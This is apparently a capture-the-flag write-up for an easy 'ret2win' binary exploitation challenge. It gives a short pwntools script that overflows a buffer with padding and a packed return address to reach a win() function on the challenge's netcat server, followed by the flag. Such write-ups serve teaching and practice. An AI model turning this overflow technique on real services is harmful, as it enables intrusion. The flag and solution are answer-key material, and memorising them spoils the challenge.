# ret2win

> Points: 75

> Category: pwn

## Description

Here comes your monthly dose of one easy pwn. Can you reach the `win()` function?

## Attachments

https://imaginary.ml/r/C2B3-ret2win

`nc stephencurry.ctfchallenge.ga 5000`

## Solution

```py
from pwn import *

p = remote('stephencurry.ctfchallenge.ga', 5000)

print(p.recv())
p.sendline(b"A" * 12 + p64(0x1337c0d3))
print(p.recv())

p.sendline(b"A"*36 + p64(0x4011b6))
print(p.recv())
```

### Flag

> ictf{mak1ng_r@nd0m_flags_15_n0t_fun}
